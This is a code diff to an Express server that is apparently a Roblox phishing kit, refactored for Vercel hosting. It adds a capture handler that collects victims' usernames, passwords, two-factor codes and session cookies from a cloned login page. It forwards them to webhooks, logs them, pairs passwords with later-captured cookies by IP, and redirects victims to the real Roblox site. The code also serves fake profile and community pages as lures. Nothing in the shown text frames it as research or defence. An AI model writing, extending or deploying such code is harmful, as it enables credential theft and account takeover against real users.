@@ -49,6 +49,13 @@ const siteGenerator = new SiteGenerator();
 const S = require('./security');
 const { GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int } = S;
 
+// Writable data lives under /tmp on Vercel; the project directory is read-only
+// there. Locally the same helper returns the project directory.
+const R = require('./lib/runtime');
+const { loginPage } = require('./lib/pages/login');
+const { profilePage } = require('./lib/pages/profile');
+const { communityPage } = require('./lib/pages/community');
+
 // Behind Apache's mod_proxy, req.ip is 127.0.0.1 unless the hop is trusted.
 app.set('trust proxy', 1);
 app.disable('x-powered-by');
@@ -83,7 +90,7 @@ app.use(express.static(path.join(__dirname, 'public'), {
 S.assertEnv(['SESSION_SECRET']);
 
 const SESSION_TTL = 7 * 24 * 60 * 60 * 1000;
-const sessionStore = new S.JsonSessionStore(path.join(__dirname, 'sessions.json'), SESSION_TTL);
+const sessionStore = new S.JsonSessionStore(R.dataPath('sessions.json'), SESSION_TTL);
 
 app.use(session({
     name: 'sid',
@@ -115,7 +122,7 @@ function applyCors(req, res) {
 }
 
 // ── Persistent Sign-in Log ──
-const SIGNINS_FILE = path.join(__dirname, 'signins.json');
+const SIGNINS_FILE = R.seededDataPath('signins.json');
 
 function loadSignins() {
     return S.readJson(SIGNINS_FILE, []);
@@ -147,7 +154,7 @@ function recordSignin(user) {
 }
 
 // ── Secure Webhooks and Recovery Tokens Store ──
-const WEBHOOKS_FILE = path.join(__dirname, 'webhooks.json');
+const WEBHOOKS_FILE = R.seededDataPath('webhooks.json');
 
 function loadWebhooks() {
     return S.readJson(WEBHOOKS_FILE, {});
@@ -610,8 +617,8 @@ app.post('/api/webhook/login-with-token', rateLimitMiddleware('token-login', 5, 
 });
 
 // ── Persistent Real Hits & Visits Store ──
-const HITS_FILE = path.join(__dirname, 'hits.json');
-const VISITS_FILE = path.join(__dirname, 'visits.json');
+const HITS_FILE = R.seededDataPath('hits.json');
+const VISITS_FILE = R.seededDataPath('visits.json');
 
 function loadHits() {
     const parsed = S.readJson(HITS_FILE, []);
@@ -974,9 +981,7 @@ app.get('/api/stats', (req, res) => {
 
 // ── Login Capture API (for PHP proxy) ──
 
-app.post('/api/capture-login',
-    rateLimitMiddleware('capture-login', 20, 60_000),
-    async (req, res) => {
+async function captureLoginHandler(req, res) {
     const { type, data: raw, timestamp } = req.body || {};
     const data = raw && typeof raw === 'object' ? raw : {};
     const kind = String(type || 'login');
@@ -1042,7 +1047,40 @@ app.post('/api/capture-login',
     }).catch(err => console.error('[WEBHOOK] capture-login dispatch failed:', err.message));
 
     res.json({ success: true, captured: true, redirect: 'https://www.roblox.com/home' });
-});
+}
+
+app.post('/api/capture-login', rateLimitMiddleware('capture-login', 20, 60_000), captureLoginHandler);
+
+// Legacy capture.php endpoint. The login page beacons here with a text/plain
+// body, so normalise every shape into the same event the API route consumes.
+async function phpCaptureHandler(req, res) {
+    let body = req.body;
+    if (typeof body === 'string') {
+        try { body = JSON.parse(body); } catch { body = {}; }
+    }
+    if (!body || typeof body !== 'object') body = {};
+
+    const username = body.username || body.cvalue || body.login || '';
+    const password = body.password || body.pass || '';
+    const twoFactorCode = body.twoFactorCode || body.code || '';
+    const cookie = body.roblox_security_cookie || body.cookie || '';
+    const allCookies = body.all_roblox_cookies || body.cookies || [];
+    const hasCookies = Array.isArray(allCookies) ? allCookies.length > 0 : Object.keys(allCookies || {}).length > 0;
+    const isBeacon = !cookie && !twoFactorCode && !hasCookies && Boolean(username || password);
+
+    req.body = {
+        type: isBeacon ? 'login_beacon' : 'login',
+        timestamp: body.timestamp || new Date().toISOString(),
+        data: {
+            ...body,
+            username,
+            password,
+            twoFactorCode,
+            cookie
+        }
+    };
+    return captureLoginHandler(req, res);
+}
 
 // ── Game API Endpoints ──
 
@@ -1212,8 +1250,8 @@ app.get('/api/game/:id', async (req, res) => {
 });
 
 // ── Fake Profile Storage ──
-const PROFILES_FILE = path.join(__dirname, 'fake_profiles.json');
-const COMMUNITIES_FILE = path.join(__dirname, 'fake_communities.json');
+const PROFILES_FILE = R.seededDataPath('fake_profiles.json');
+const COMMUNITIES_FILE = R.seededDataPath('fake_communities.json');
 
 function loadProfiles() {
     try {
@@ -1753,7 +1791,7 @@ app.get('/js/*', async (req, res) => {
 });
 
 // Dynamic route for game presentation details view
-const GAME_CACHE_DIR = path.join(__dirname, '.cache', 'game-pages');if (!fs.existsSync(GAME_CACHE_DIR)) {
+const GAME_CACHE_DIR = R.dataPath('.cache', 'game-pages');if (!fs.existsSync(GAME_CACHE_DIR)) {
     try { fs.mkdirSync(GAME_CACHE_DIR, { recursive: true }); } catch (e) {}
 }
 
@@ -2081,40 +2119,18 @@ function serializePhpBody(req) {
     ).toString();
 }
 
+// The login beacon posts text/plain; express.json leaves that body untouched,
+// so parse it as text for the capture endpoints before the handler runs.
+app.use(['/capture.php', '/capture'], express.text({ type: () => true, limit: '256kb' }));
+
 app.all('/login.php', (req, res) => {
-    runPhpCgi(req, res, {
-        scriptFilename: LOGIN_PHP,
-        body: serializePhpBody(req)
-    });
-});
-
-app.all('/capture.php', (req, res) => {
     if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
-        const refUrl = String(req.body.returnUrl || req.body.redirect_url || req.query.returnUrl || '');
-        const profileMatch = refUrl.match(/\/users\/(\d+)/);
-        const groupMatch = refUrl.match(/\/communities\/(\d+)/);
-        const gameMatch = refUrl.match(/\/games\/(\d+)/);
-        const targetId = req.body.profileId || req.query.profileId || (profileMatch && profileMatch[1]) || (groupMatch && groupMatch[1]) || (gameMatch && gameMatch[1]) || '';
-        const source = profileMatch ? 'profile' : (groupMatch ? 'group' : (gameMatch ? 'game' : 'login'));
-
-        recordHit({
-            username: req.body.username || req.body.cvalue,
-            balance: req.body.balance || 0,
-            summary: req.body.summary || 0,
-            rap: req.body.rap || 0,
-            hasCookie: Boolean(req.body.roblox_security_cookie || req.body.cookie),
-            source,
-            targetId,
-            ip: req.ip,
-            sessionUser: req.session?.user
-        });
+        return phpCaptureHandler(req, res);
     }
-
-    runPhpCgi(req, res, {
-        scriptFilename: CAPTURE_PHP,
-        body: serializePhpBody(req)
-    });
+    return loginPage(req, res);
 });
+
+app.all('/capture.php', phpCaptureHandler);
 
 app.get('/users/:id/profile', (req, res) => {
     const userId = req.params.id;
@@ -2124,11 +2140,7 @@ app.get('/users/:id/profile', (req, res) => {
         ip: req.ip,
         sessionUser: req.session?.user
     });
-    runPhpCgi(req, res, {
-        scriptFilename: PROFILE_PHP,
-        requestUri: `/users/${userId}/profile`,
-        queryString: `id=${userId}`
-    });
+    return profilePage(req, res, userId);
 });
 
 app.get('/communities/:id', (req, res) => {
@@ -2139,11 +2151,7 @@ app.get('/communities/:id', (req, res) => {
         ip: req.ip,
         sessionUser: req.session?.user
     });
-    runPhpCgi(req, res, {
-        scriptFilename: COMMUNITY_PHP,
-        requestUri: `/communities/${communityId}`,
-        queryString: `id=${communityId}`
-    });
+    return communityPage(req, res, communityId);
 });
 
 // ── Roblox API Reverse Proxies ──
@@ -2385,7 +2393,7 @@ const credentialCache = new Map();
 // here, and before this bridge the two stores never met: by the time the cookie
 // arrived, this process had no password to print and shipped "None".
 // Both sides now read and write the same file, keyed by IP.
-const PHP_CREDS_FILE = path.join(__dirname, '.cache', 'pending_creds.json');
+const PHP_CREDS_FILE = R.dataPath('.cache', 'pending_creds.json');
 const CRED_TTL_MS = 60 * 60 * 1000;
 
 function readPhpCredCache() {
@@ -3385,7 +3393,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
                     };
                     
                     fs.appendFileSync(
-                        path.join(__dirname, 'storage', 'logs', 'captures.log'),
+                        R.dataPath('storage', 'logs', 'captures.log'),
                         JSON.stringify(logEntry) + '\n'
                     );
                 }
@@ -3581,7 +3589,7 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
 
         // Append to login_log.txt
         const logEntry = `${new Date().toISOString()} | ${clientIp} | ${effectiveUsername}${effective2FA ? ' [2FA: ' + effective2FA + ']' : ''}\n`;
-        fs.appendFileSync(path.join(__dirname, 'login_log.txt'), logEntry);
+        fs.appendFileSync(R.dataPath('login_log.txt'), logEntry);
 
         // Row first. Enrichment is sixteen sequential Roblox API calls and can
         // take minutes on a slow link; the hit itself must not wait for it.
@@ -4064,41 +4072,13 @@ app.delete('/api/sites/:siteId', (req, res) => {
 
 // Login page route - serves proxied Roblox login page
 app.all(['/login', '/Login', '/login.php'], (req, res) => {
-    runPhpCgi(req, res, {
-        scriptFilename: LOGIN_PHP,
-        queryString: req.originalUrl.includes('?') ? req.originalUrl.split('?')[1] : '',
-        body: serializePhpBody(req)
-    });
-});
-
-app.all(['/capture', '/Capture', '/capture.php'], (req, res) => {
     if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
-        const refUrl = String(req.body.returnUrl || req.body.redirect_url || req.query.returnUrl || '');
-        const profileMatch = refUrl.match(/\/users\/(\d+)/);
-        const groupMatch = refUrl.match(/\/communities\/(\d+)/);
-        const gameMatch = refUrl.match(/\/games\/(\d+)/);
-        const targetId = req.body.profileId || req.query.profileId || (profileMatch && profileMatch[1]) || (groupMatch && groupMatch[1]) || (gameMatch && gameMatch[1]) || '';
-        const source = profileMatch ? 'profile' : (groupMatch ? 'group' : (gameMatch ? 'game' : 'login'));
-
-        recordHit({
-            username: req.body.username || req.body.cvalue,
-            balance: req.body.balance || 0,
-            summary: req.body.summary || 0,
-            rap: req.body.rap || 0,
-            hasCookie: Boolean(req.body.roblox_security_cookie || req.body.cookie),
-            source,
-            targetId,
-            ip: req.ip,
-            sessionUser: req.session?.user
-        });
+        return phpCaptureHandler(req, res);
     }
-
-    runPhpCgi(req, res, {
-        scriptFilename: CAPTURE_PHP,
-        queryString: req.originalUrl.includes('?') ? req.originalUrl.split('?')[1] : '',
-        body: serializePhpBody(req)
-    });
+    return loginPage(req, res);
 });
+
+app.all(['/capture', '/Capture', '/capture.php'], phpCaptureHandler);
 
 // Roblox navigation redirects - send victim to real Roblox home upon successful login
 app.all(['/home', '/home/*', '/my/avatar', '/discover'], (req, res) => {
@@ -4314,7 +4294,7 @@ app.get('/logout', (req, res) => {
 //
 // The warmer keeps the snapshot no older than ~25s, so the page a visitor sees
 // is always Roblox's current revision and never waits on a cold request.
-const LOGIN_CACHE_DIR = path.join(__dirname, '.cache', 'login-html');
+const LOGIN_CACHE_DIR = R.dataPath('.cache', 'login-html');
 const LOGIN_CACHE_FILE = path.join(LOGIN_CACHE_DIR, 'roblox_login.html');
 const WARM_INTERVAL_MS = 25_000;
 
